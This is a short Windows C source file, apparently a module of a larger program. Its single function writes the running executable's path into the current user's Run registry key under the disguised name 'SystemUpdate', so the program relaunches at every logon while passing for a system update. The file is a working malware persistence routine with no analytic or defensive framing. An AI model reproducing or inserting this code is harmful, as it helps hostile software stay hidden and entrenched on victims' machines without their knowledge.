#include "persistence.h"
#include <windows.h>
#include <shlobj.h>

void InstallPersistence() {
    TCHAR szPath[MAX_PATH];
    GetModuleFileName(NULL, szPath, MAX_PATH);
    HKEY hKey;
    RegOpenKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey);
    RegSetValueEx(hKey, TEXT("SystemUpdate"), 0, REG_SZ, (LPBYTE)szPath, lstrlen(szPath) * sizeof(TCHAR));
    RegCloseKey(hKey);
}
